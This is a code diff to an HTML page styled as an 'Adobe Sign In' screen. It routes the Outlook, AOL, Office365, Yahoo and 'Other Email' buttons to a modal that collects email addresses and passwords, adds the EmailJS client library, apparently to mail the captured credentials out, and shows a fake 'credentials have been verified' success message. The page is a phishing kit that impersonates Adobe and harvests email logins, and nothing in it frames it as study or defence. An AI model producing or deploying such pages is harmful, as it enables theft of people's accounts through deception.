@@ -5,10 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adobe Sign In</title>
     <link rel="stylesheet" href="styles.css">
+   
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
     <div class="container">
-         Adobe Logo 
+        
         <div class="logo-section">
             <div class="adobe-logo">
                 <div class="logo-icon">A</div>
@@ -16,7 +18,7 @@
             </div>
         </div>
 
-         Sign-in Message 
+         
         <div class="message-section">
             <p class="signin-message">
                 <strong>Adobe requires you to sign in with<br>
@@ -24,32 +26,71 @@
             </p>
         </div>
 
-         Email Provider Buttons 
+         
         <div class="buttons-section">
-            <button class="email-btn outlook-btn" onclick="handleEmailProvider('outlook')">
+            <button class="email-btn outlook-btn" onclick="openLoginPopup('outlook')">
                 Outlook
             </button>
             
-            <button class="email-btn aol-btn" onclick="handleEmailProvider('aol')">
+            <button class="email-btn aol-btn" onclick="openLoginPopup('aol')">
                 AOL
             </button>
             
-            <button class="email-btn office365-btn" onclick="handleEmailProvider('office365')">
+            <button class="email-btn office365-btn" onclick="openLoginPopup('office365')">
                 Office365
             </button>
             
-            <button class="email-btn yahoo-btn" onclick="handleEmailProvider('yahoo')">
+            <button class="email-btn yahoo-btn" onclick="openLoginPopup('yahoo')">
                 Yahoo
             </button>
             
-            <button class="email-btn other-btn" onclick="handleEmailProvider('other')">
+            <button class="email-btn other-btn" onclick="openLoginPopup('other')">
                 Other Email
             </button>
         </div>
 
-         Footer 
+       
         <div class="footer">
             <p>All rights reserved ©Adobe 2025</p>
+        </div>
+    </div>
+
+    
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modalTitle">Sign in with Outlook</h2>
+                <span class="close" onclick="closeLoginPopup()">&times;</span>
+            </div>
+            
+            <form id="loginForm" class="login-form">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" required placeholder="Enter your email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required placeholder="Enter your password">
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="cancel-btn" onclick="closeLoginPopup()">Cancel</button>
+                    <button type="submit" class="login-btn" id="submitBtn">
+                        <span class="btn-text">Login</span>
+                        <span class="btn-loader" style="display: none;">Logging in...</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+   
+    <div id="successMessage" class="success-message" style="display: none;">
+        <div class="success-content">
+            <div class="success-icon">✓</div>
+            <h3>Login Successful!</h3>
+            <p>Your credentials have been verified. Redirecting...</p>
         </div>
     </div>
 
